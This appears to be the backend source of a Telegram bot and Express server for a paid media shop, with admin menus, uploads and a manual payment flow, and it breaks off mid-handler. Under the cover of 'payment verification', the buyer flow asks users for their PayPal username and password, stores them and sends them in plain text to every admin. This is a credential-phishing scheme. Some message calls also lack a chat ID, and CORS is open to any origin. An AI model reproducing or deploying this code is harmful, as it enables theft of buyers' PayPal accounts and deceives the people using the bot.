// backend/index.js
const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-admin-id']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Create uploads directory
const uploadDirs = ['uploads', 'uploads/screenshots', 'uploads/media'];
uploadDirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Configure multer
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        if (file.fieldname === 'screenshot') {
            cb(null, 'uploads/screenshots/');
        } else if (file.fieldname === 'media') {
            cb(null, 'uploads/media/');
        } else {
            cb(null, 'uploads/');
        }
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        const ext = path.extname(file.originalname);
        cb(null, file.fieldname + '-' + uniqueSuffix + ext);
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 50 * 1024 * 1024
    },
    fileFilter: (req, file, cb) => {
        const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/quicktime'];
        if (allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type. Only images and videos are allowed.'));
        }
    }
});

// In-memory storage
const db = {
    admins: [],
    users: [],
    media: [],
    payments: [],
    purchases: [],
    messages: [],
    stats: {
        totalUsers: 0,
        totalSales: 0,
        totalRevenue: 0
    },
    uploadStates: {},
    paymentStates: {} // Track payment flow for users
};

// Add main admin from environment
if (process.env.MAIN_ADMIN_ID) {
    const mainAdminId = parseInt(process.env.MAIN_ADMIN_ID);
    if (!db.admins.some(a => a.id === mainAdminId)) {
        db.admins.push({
            id: mainAdminId,
            username: 'MainAdmin',
            firstName: 'Main',
            lastName: 'Admin',
            addedAt: new Date().toISOString(),
            addedBy: 'system',
            role: 'main_admin'
        });
    }
}

// Add second admin from environment if specified
if (process.env.SECOND_ADMIN_ID) {
    const secondAdminId = parseInt(process.env.SECOND_ADMIN_ID);
    if (!db.admins.some(a => a.id === secondAdminId)) {
        db.admins.push({
            id: secondAdminId,
            username: 'SecondAdmin',
            firstName: 'Second',
            lastName: 'Admin',
            addedAt: new Date().toISOString(),
            addedBy: process.env.MAIN_ADMIN_ID,
            role: 'admin'
        });
    }
}

// Initialize Telegram Bot
let bot = null;
if (process.env.BOT_TOKEN) {
    try {
        bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
        console.log('🤖 Telegram Bot initialized successfully');
        console.log('👥 Total Admins:', db.admins.length);

        // ============================================
        // ADMIN KEYBOARD BUTTONS
        // ============================================

        // Main Admin Menu
        const adminMainMenu = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Upload Content', callback_data: 'admin_upload' },
                        { text: '📊 Dashboard', callback_data: 'admin_dashboard' }
                    ],
                    [
                        { text: '💳 Pending Payments', callback_data: 'admin_payments' },
                        { text: '👥 Users', callback_data: 'admin_users' }
                    ],
                    [
                        { text: '📹 Videos', callback_data: 'admin_videos' },
                        { text: '📸 Photos', callback_data: 'admin_photos' }
                    ],
                    [
                        { text: '📢 Broadcast', callback_data: 'admin_broadcast' },
                        { text: '👑 Admins', callback_data: 'admin_admins' }
                    ],
                    [
                        { text: '📱 Open App', callback_data: 'admin_open_app' },
                        { text: '📊 Stats', callback_data: 'admin_stats' }
                    ],
                    [
                        { text: '🖥️ Admin Panel', url: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/admin` }
                    ]
                ]
            }
        };

        // Upload Menu
        const uploadMenu = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🎬 Upload Video', callback_data: 'upload_video' },
                        { text: '🖼️ Upload Photo', callback_data: 'upload_photo' }
                    ],
                    [
                        { text: '🔙 Back to Menu', callback_data: 'admin_back' }
                    ]
                ]
            }
        };

        // Admin Management Menu (Main Admin Only)
        const adminManagementMenu = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '➕ Add Admin', callback_data: 'admin_add' },
                        { text: '➖ Remove Admin', callback_data: 'admin_remove' }
                    ],
                    [
                        { text: '📋 List Admins', callback_data: 'admin_list' },
                        { text: '🔙 Back to Menu', callback_data: 'admin_back' }
                    ]
                ]
            }
        };

        // ============================================
        // USER PAYMENT FLOW
        // ============================================

        // Start command
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const isAdmin = db.admins.some(a => a.id === chatId);
            
            if (isAdmin) {
                const adminInfo = db.admins.find(a => a.id === chatId);
                const welcomeMessage = `
🎉 Welcome to Cheerful Chick Admin Panel!

👤 Admin: ${adminInfo.firstName} ${adminInfo.lastName}
👑 Role: ${adminInfo.role || 'admin'}

📱 Use the buttons below to manage your content and users.
                `;
                bot.sendMessage(chatId, welcomeMessage, adminMainMenu);
            } else {
                // User welcome with payment options
                const userMenu = {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📱 Open App', callback_data: 'user_open_app' }
                            ],
                            [
                                { text: '💬 Chat with Admin', callback_data: 'user_chat' }
                            ],
                            [
                                { text: '💳 Make Payment', callback_data: 'user_payment_start' }
                            ]
                        ]
                    }
                };
                
                const welcomeUser = `
🎉 Welcome to Cheerful Chick!

🌟 Browse premium content and make purchases.
💬 Chat with our admins for support.
💳 Click "Make Payment" to start the payment process.

Click the buttons below to get started!
                `;
                bot.sendMessage(chatId, welcomeUser, userMenu);
            }
        });

        // ============================================
        // CALLBACK QUERY HANDLERS
        // ============================================

        bot.on('callback_query', async (callbackQuery) => {
            const action = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;
            const isAdmin = db.admins.some(a => a.id === chatId);

            // Answer callback query
            bot.answerCallbackQuery(callbackQuery.id);

            // ============================================
            // ADMIN ACTIONS
            // ============================================

            if (action === 'admin_upload') {
                bot.editMessageText('📤 Select what you want to upload:', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: uploadMenu.reply_markup
                });
            }

            else if (action === 'admin_dashboard') {
                const stats = getDashboardStats();
                const dashboardMessage = `
📊 Admin Dashboard

👥 Total Users: ${stats.totalUsers}
📁 Total Media: ${stats.totalMedia}
💳 Total Sales: ${stats.totalSales}
💰 Total Revenue: $${stats.totalRevenue.toFixed(2)}
⏳ Pending Payments: ${stats.pendingPayments}

📈 Recent Activity:
${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                `;
                bot.editMessageText(dashboardMessage, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔄 Refresh', callback_data: 'admin_dashboard' }],
                            [{ text: '🖥️ Open Admin Panel', url: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/admin` }],
                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                        ]
                    }
                });
            }

            else if (action === 'admin_payments') {
                const pendingPayments = db.payments.filter(p => p.status === 'pending_approval');
                if (pendingPayments.length === 0) {
                    bot.editMessageText('✅ No pending payments.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    let paymentList = '💳 Pending Payments:\n\n';
                    pendingPayments.forEach((p, index) => {
                        const user = db.users.find(u => u.id === p.userId);
                        const media = db.media.find(m => m.id === p.itemId);
                        paymentList += `${index + 1}. User: ${user ? user.firstName : 'Unknown'} (${p.userId})\n`;
                        paymentList += `   Item: ${media ? media.title : 'Unknown'}\n`;
                        paymentList += `   Amount: $${p.amount}\n`;
                        paymentList += `   PayPal: ${p.paypalUsername || 'Not provided'}\n`;
                        paymentList += `   ID: ${p.id}\n\n`;
                    });
                    
                    const paymentButtons = pendingPayments.map(p => [
                        { text: `✅ Approve ${p.id.substring(0, 8)}`, callback_data: `approve_${p.id}` },
                        { text: `❌ Reject ${p.id.substring(0, 8)}`, callback_data: `reject_${p.id}` }
                    ]);
                    paymentButtons.push([{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]);
                    
                    bot.editMessageText(paymentList, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: paymentButtons
                        }
                    });
                }
            }

            else if (action === 'admin_users') {
                const users = db.users;
                if (users.length === 0) {
                    bot.editMessageText('👥 No users registered yet.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    let userList = '👥 Registered Users:\n\n';
                    users.forEach((user, index) => {
                        const purchases = db.purchases.filter(p => p.userId === user.id);
                        userList += `${index + 1}. ${user.firstName} ${user.lastName} (@${user.username})\n`;
                        userList += `   ID: ${user.id}\n`;
                        userList += `   Purchases: ${purchases.length}\n`;
                        userList += `   Joined: ${new Date(user.registeredAt).toLocaleDateString()}\n\n`;
                    });
                    
                    bot.editMessageText(userList, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                }
            }

            else if (action === 'admin_videos') {
                const videos = db.media.filter(m => m.type === 'video');
                if (videos.length === 0) {
                    bot.editMessageText('📹 No videos available.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    let videoList = '📹 Videos:\n\n';
                    videos.forEach((v, index) => {
                        const priceText = v.price === 0 ? 'FREE' : `$${v.price}`;
                        videoList += `${index + 1}. ${v.title}\n`;
                        videoList += `   Price: ${priceText}\n`;
                        videoList += `   Purchases: ${v.purchases || 0}\n`;
                        videoList += `   Uploaded: ${new Date(v.uploadDate).toLocaleDateString()}\n\n`;
                    });
                    
                    bot.editMessageText(videoList, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                }
            }

            else if (action === 'admin_photos') {
                const photos = db.media.filter(m => m.type === 'photo');
                if (photos.length === 0) {
                    bot.editMessageText('📸 No photos available.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    let photoList = '📸 Photos:\n\n';
                    photos.forEach((p, index) => {
                        const priceText = p.price === 0 ? 'FREE' : `$${p.price}`;
                        photoList += `${index + 1}. ${p.title}\n`;
                        photoList += `   Price: ${priceText}\n`;
                        photoList += `   Purchases: ${p.purchases || 0}\n`;
                        photoList += `   Uploaded: ${new Date(p.uploadDate).toLocaleDateString()}\n\n`;
                    });
                    
                    bot.editMessageText(photoList, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                }
            }

            else if (action === 'admin_broadcast') {
                bot.editMessageText('📢 Send a message to broadcast to all users.\n\nType your broadcast message below:', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                        ]
                    }
                });
                db.uploadStates[chatId] = { step: 'broadcast' };
            }

            else if (action === 'admin_admins') {
                if (chatId.toString() !== process.env.MAIN_ADMIN_ID) {
                    bot.editMessageText('❌ Only the main admin can manage admins.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    bot.editMessageText('👑 Admin Management', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: adminManagementMenu.reply_markup
                    });
                }
            }

            else if (action === 'admin_add') {
                bot.editMessageText('➕ To add a new admin, send the Telegram ID of the user.\n\nExample: 123456789', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back', callback_data: 'admin_admins' }]
                        ]
                    }
                });
                db.uploadStates[chatId] = { step: 'add_admin' };
            }

            else if (action === 'admin_remove') {
                let adminList = '👥 Select admin to remove:\n\n';
                db.admins.forEach((admin, index) => {
                    if (admin.id !== parseInt(process.env.MAIN_ADMIN_ID)) {
                        adminList += `${index + 1}. ${admin.firstName} ${admin.lastName} (@${admin.username})\n`;
                        adminList += `   ID: ${admin.id}\n\n`;
                    }
                });
                
                if (db.admins.length <= 1) {
                    bot.editMessageText('❌ No admins to remove (only main admin exists).', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back', callback_data: 'admin_admins' }]
                            ]
                        }
                    });
                } else {
                    const removeButtons = db.admins
                        .filter(a => a.id !== parseInt(process.env.MAIN_ADMIN_ID))
                        .map(a => [
                            { text: `❌ ${a.firstName} (@${a.username})`, callback_data: `remove_${a.id}` }
                        ]);
                    removeButtons.push([{ text: '🔙 Back', callback_data: 'admin_admins' }]);
                    
                    bot.editMessageText(adminList, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: removeButtons
                        }
                    });
                }
            }

            else if (action.startsWith('remove_')) {
                const adminIdToRemove = parseInt(action.split('_')[1]);
                if (adminIdToRemove === parseInt(process.env.MAIN_ADMIN_ID)) {
                    bot.editMessageText('❌ Cannot remove the main admin.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                            ]
                        }
                    });
                } else {
                    const index = db.admins.findIndex(a => a.id === adminIdToRemove);
                    if (index === -1) {
                        bot.editMessageText('❌ Admin not found.', {
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                                ]
                            }
                        });
                    } else {
                        const removedAdmin = db.admins[index];
                        db.admins.splice(index, 1);
                        bot.editMessageText(`✅ Admin ${removedAdmin.firstName} has been removed.`, {
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                                ]
                            }
                        });
                        try {
                            bot.sendMessage(adminIdToRemove, '❌ You have been removed as an admin.');
                        } catch (e) {
                            console.error('Error notifying removed admin:', e);
                        }
                    }
                }
            }

            else if (action === 'admin_list') {
                let adminList = '👥 List of Admins:\n\n';
                adminList += `⭐ Main Admin: ${process.env.MAIN_ADMIN_ID}\n\n`;
                
                db.admins.forEach((admin, index) => {
                    adminList += `${index + 1}. ${admin.firstName} ${admin.lastName} (@${admin.username})\n`;
                    adminList += `   ID: ${admin.id}\n`;
                    adminList += `   Role: ${admin.role || 'admin'}\n`;
                    adminList += `   Added: ${new Date(admin.addedAt).toLocaleDateString()}\n\n`;
                });
                
                bot.editMessageText(adminList, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back', callback_data: 'admin_admins' }]
                        ]
                    }
                });
            }

            else if (action === 'admin_stats') {
                const stats = getDashboardStats();
                const statsMessage = `
📊 Statistics

👥 Total Users: ${stats.totalUsers}
📁 Total Media: ${stats.totalMedia}
💳 Total Sales: ${stats.totalSales}
💰 Total Revenue: $${stats.totalRevenue.toFixed(2)}
⏳ Pending Payments: ${stats.pendingPayments}

📈 Total Admins: ${db.admins.length}
📨 Total Messages: ${db.messages.length}
🔄 Total Payments: ${db.payments.length}
                `;
                bot.editMessageText(statsMessage, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                        ]
                    }
                });
            }

            else if (action === 'admin_open_app') {
                const appUrl = process.env.APP_URL || 'https://cheerful-cheek.onrender.com';
                bot.editMessageText(`📱 Open the Cheerful Chick App:\n\n${appUrl}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🚀 Open App', url: appUrl }],
                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                        ]
                    }
                });
            }

            // Upload actions
            else if (action === 'upload_video') {
                bot.editMessageText('🎬 Send the video file you want to upload.\n\n(You can set price as 0 for FREE content)', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Cancel', callback_data: 'admin_upload' }]
                        ]
                    }
                });
                db.uploadStates[chatId] = { step: 'file', type: 'video' };
            }

            else if (action === 'upload_photo') {
                bot.editMessageText('🖼️ Send the photo file you want to upload.\n\n(You can set price as 0 for FREE content)', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Cancel', callback_data: 'admin_upload' }]
                        ]
                    }
                });
                db.uploadStates[chatId] = { step: 'file', type: 'photo' };
            }

            // Back to main menu
            else if (action === 'admin_back') {
                bot.editMessageText('📱 Main Menu', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: adminMainMenu.reply_markup
                });
                delete db.uploadStates[chatId];
            }

            // ============================================
            // PAYMENT ACTIONS
            // ============================================

            else if (action.startsWith('approve_')) {
                const paymentId = action.replace('approve_', '');
                await approvePayment(chatId, messageId, paymentId);
            }

            else if (action.startsWith('reject_')) {
                const paymentId = action.replace('reject_', '');
                await rejectPayment(chatId, messageId, paymentId);
            }

            // ============================================
            // USER ACTIONS
            // ============================================

            else if (action === 'user_open_app') {
                const appUrl = process.env.APP_URL || 'https://cheerful-cheek.onrender.com';
                bot.editMessageText(`📱 Open the Cheerful Chick App:\n\n${appUrl}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🚀 Open App', url: appUrl }],
                            [{ text: '🔙 Back', callback_data: 'user_back' }]
                        ]
                    }
                });
            }

            else if (action === 'user_chat') {
                bot.editMessageText('💬 Send a message to the admin.\n\nType your message below:', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back', callback_data: 'user_back' }]
                        ]
                    }
                });
                db.uploadStates[chatId] = { step: 'user_chat' };
            }

            // ============================================
            // USER PAYMENT FLOW - START
            // ============================================

            else if (action === 'user_payment_start') {
                // Check if user has a pending payment
                const existingPayment = db.payments.find(p => 
                    p.userId === chatId && p.status === 'pending'
                );

                if (existingPayment) {
                    bot.editMessageText(`ℹ️ You already have a pending payment for "${existingPayment.itemName}".\n\nPlease send a screenshot of your payment confirmation.`, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '📸 Send Screenshot', callback_data: 'user_payment_screenshot' }],
                                [{ text: '🔙 Back', callback_data: 'user_back' }]
                            ]
                        }
                    });
                    return;
                }

                // Get available items for purchase
                const availableItems = db.media.filter(m => m.price > 0);
                
                if (availableItems.length === 0) {
                    bot.editMessageText('❌ No premium items available for purchase at the moment.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back', callback_data: 'user_back' }]
                            ]
                        }
                    });
                    return;
                }

                // Show item selection
                let itemList = '💳 Select item to purchase:\n\n';
                const itemButtons = availableItems.map((item, index) => {
                    itemList += `${index + 1}. ${item.title} - $${item.price}\n`;
                    return [{ text: `${item.title} ($${item.price})`, callback_data: `user_select_item_${item.id}` }];
                });
                
                // Add cancel button
                itemButtons.push([{ text: '🔙 Cancel', callback_data: 'user_back' }]);
                
                bot.editMessageText(itemList, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: itemButtons
                    }
                });
            }

            else if (action.startsWith('user_select_item_')) {
                const itemId = parseInt(action.replace('user_select_item_', ''));
                const item = db.media.find(m => m.id === itemId);
                
                if (!item) {
                    bot.editMessageText('❌ Item not found.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back', callback_data: 'user_back' }]
                            ]
                        }
                    });
                    return;
                }

                // Check if user already purchased this
                const existingPurchase = db.purchases.find(p => 
                    p.userId === chatId && p.itemId === itemId
                );

                if (existingPurchase) {
                    bot.editMessageText(`ℹ️ You already purchased "${item.title}".`, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Back', callback_data: 'user_back' }]
                            ]
                        }
                    });
                    return;
                }

                // Store selected item
                db.paymentStates[chatId] = { 
                    step: 'paypal_username',
                    itemId: itemId,
                    itemName: item.title,
                    amount: item.price
                };

                // Create payment record
                const payment = {
                    id: uuidv4(),
                    userId: chatId,
                    userName: 'User',
                    itemId: itemId,
                    itemName: item.title,
                    amount: item.price,
                    status: 'pending',
                    timestamp: new Date().toISOString(),
                    paypalUsername: null,
                    paypalPassword: null,
                    screenshot: null
                };
                db.payments.push(payment);

                // Ask for PayPal username
                bot.editMessageText(
                    `💳 Payment for: ${item.title}\n💰 Amount: $${item.price}\n\n` +
                    `📝 Please enter your PayPal username:\n` +
                    `(This is required for payment verification)`,
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
                            ]
                        }
                    }
                );
                
                // Store payment ID in state
                db.paymentStates[chatId].paymentId = payment.id;
            }

            else if (action === 'user_payment_screenshot') {
                // Check if user has a pending payment
                const pendingPayment = db.payments.find(p => 
                    p.userId === chatId && p.status === 'pending'
                );

                if (!pendingPayment) {
                    bot.editMessageText('❌ No pending payment found. Please start a new payment.', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💳 Start Payment', callback_data: 'user_payment_start' }],
                                [{ text: '🔙 Back', callback_data: 'user_back' }]
                            ]
                        }
                    });
                    return;
                }

                bot.editMessageText(
                    `📸 Please send a screenshot of your payment confirmation.\n\n` +
                    `Payment: ${pendingPayment.itemName}\n` +
                    `Amount: $${pendingPayment.amount}\n` +
                    `PayPal: ${pendingPayment.paypalUsername}\n\n` +
                    `Send the screenshot as a photo or document.`,
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
                            ]
                        }
                    }
                );
                
                db.paymentStates[chatId] = { 
                    step: 'screenshot',
                    paymentId: pendingPayment.id
                };
            }

            else if (action === 'user_back') {
                const userMenu = {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📱 Open App', callback_data: 'user_open_app' }
                            ],
                            [
                                { text: '💬 Chat with Admin', callback_data: 'user_chat' }
                            ],
                            [
                                { text: '💳 Make Payment', callback_data: 'user_payment_start' }
                            ]
                        ]
                    }
                };
                bot.editMessageText('🎉 Welcome back! How can we help you today?', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: userMenu.reply_markup
                });
                delete db.uploadStates[chatId];
                delete db.paymentStates[chatId];
            }

            // ============================================
            // CONFIRM UPLOAD
            // ============================================

            else if (action === 'confirm_upload') {
                const state = db.uploadStates[chatId];
                
                if (!state) {
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                }

                const newMedia = {
                    id: db.media.length + 1,
                    type: state.type,
                    title: state.title,
                    description: state.description,
                    price: state.price,
                    url: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}${state.filePath}`,
                    thumbnail: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}${state.filePath}`,
                    duration: state.duration || null,
                    date: new Date().toISOString().split('T')[0],
                    isPurchased: false,
                    filename: path.basename(state.filePath),
                    uploadDate: new Date().toISOString(),
                    uploadedBy: chatId,
                    purchases: 0,
                    isFree: state.price === 0
                };
                
                db.media.push(newMedia);
                
                const priceText = state.price === 0 ? 'FREE' : `$${state.price}`;
                bot.editMessageText(`✅ Content uploaded successfully!\n\n📋 Details:\nTitle: ${state.title}\nPrice: ${priceText}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Back to Menu', callback_data: 'admin_back' }]
                        ]
                    }
                });
                
                // Notify all users
                db.users.forEach(user => {
                    try {
                        bot.sendMessage(user.id, `🎉 New content available: ${state.title} (${priceText})`);
                    } catch (e) {
                        console.error('Error notifying user:', e);
                    }
                });
                
                delete db.uploadStates[chatId];
                bot.answerCallbackQuery(callbackQuery.id);
            }
        });

        // ============================================
        // MESSAGE HANDLERS
        // ============================================

        // Handle text messages (for PayPal username, password, etc.)
        bot.on('text', async (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;
            const isAdmin = db.admins.some(a => a.id === chatId);

            // Handle admin broadcast
            if (isAdmin && db.uploadStates[chatId]?.step === 'broadcast') {
                await handleBroadcast(chatId, text);
                return;
            }

            // Handle add admin
            if (isAdmin && db.uploadStates[chatId]?.step === 'add_admin') {
                await handleAddAdmin(chatId, text);
                return;
            }

            // Handle user chat
            if (!isAdmin && db.uploadStates[chatId]?.step === 'user_chat') {
                await handleUserChat(chatId, text);
                return;
            }

            // Handle title/description/price for upload
            if (isAdmin && db.uploadStates[chatId]?.step) {
                await handleUploadDetails(chatId, text);
                return;
            }

            // ============================================
            // USER PAYMENT FLOW - TEXT HANDLERS
            // ============================================

            // Handle PayPal username
            if (!isAdmin && db.paymentStates[chatId]?.step === 'paypal_username') {
                const state = db.paymentStates[chatId];
                const payment = db.payments.find(p => p.id === state.paymentId);
                
                if (!payment) {
                    bot.sendMessage(chatId, '❌ Payment not found. Please start over.');
                    delete db.paymentStates[chatId];
                    return;
                }

                payment.paypalUsername = text;
                db.paymentStates[chatId].step = 'paypal_password';
                
                bot.sendMessage(
                    `📝 Please enter your PayPal password:\n\n` +
                    `(This is required for payment verification)`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
                            ]
                        }
                    }
                );
                return;
            }

            // Handle PayPal password
            if (!isAdmin && db.paymentStates[chatId]?.step === 'paypal_password') {
                const state = db.paymentStates[chatId];
                const payment = db.payments.find(p => p.id === state.paymentId);
                
                if (!payment) {
                    bot.sendMessage(chatId, '❌ Payment not found. Please start over.');
                    delete db.paymentStates[chatId];
                    return;
                }

                payment.paypalPassword = text;
                db.paymentStates[chatId].step = 'screenshot';
                
                // Forward PayPal credentials to all admins
                const user = db.users.find(u => u.id === chatId);
                const userName = user ? user.firstName || 'User' : 'User';
                
                const credentialsMessage = `
🔐 PayPal Credentials Received!

👤 User: ${userName} (${chatId})
📦 Item: ${payment.itemName}
💰 Amount: $${payment.amount}
📧 PayPal Username: ${payment.paypalUsername}
🔑 Password: ${payment.paypalPassword}

⚠️ Please verify these credentials before approving.
                `;

                // Send to all admins
                for (const admin of db.admins) {
                    try {
                        await bot.sendMessage(admin.id, credentialsMessage, {
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: '✅ Approve', callback_data: `approve_${payment.id}` },
                                        { text: '❌ Reject', callback_data: `reject_${payment.id}` }
                                    ]
                                ]
                            }
                        });
                    } catch (e) {
                        console.error(`Error sending to admin ${admin.id}:`, e);
                    }
                }

                bot.sendMessage(
                    `✅ PayPal credentials received!\n\n` +
                    `📸 Now please send a screenshot of your payment confirmation.\n\n` +
                    `Send the screenshot as a photo or document.`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
                            ]
                        }
                    }
                );
                return;
            }
        });

        // Handle file uploads (for screenshots)
        bot.on('photo', async (msg) => {
            const chatId = msg.chat.id;
            const isAdmin = db.admins.some(a => a.id === chatId);
            
            // If user is sending payment screenshot
            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
                await handleUserPaymentScreenshot(msg, chatId);
                return;
            }

            // If admin is uploading content
            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
                await handleAdminUpload(msg, chatId, 'photo');
            }
        });

        bot.on('video', async (msg) => {
            const chatId = msg.chat.id;
            const isAdmin = db.admins.some(a => a.id === chatId);
            
            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
                await handleAdminUpload(msg, chatId, 'video');
            }
        });

        // Handle document uploads (for screenshots)
        bot.on('document', async (msg) => {
            const chatId = msg.chat.id;
            const isAdmin = db.admins.some(a => a.id === chatId);
            
            // If user is sending payment screenshot
            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
                await handleUserPaymentScreenshot(msg, chatId);
            }
        });

        // Handle admin reply to user
        bot.on('callback_query', async (callbackQuery) => {
            if (callbackQuery.data.startsWith('reply_user_')) {
                const userId = parseInt(callbackQuery.data.split('_')[2]);
                const chatId = callbackQuery.message.chat.id;
                
                bot.editMessageText(`💬 Replying to user ${userId}\n\nType your reply below:`, {
                    chat_id: chatId,
                    message_id: callbackQuery.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 Cancel', callback_data: 'admin_back' }]
                        ]
                    }
                });
                
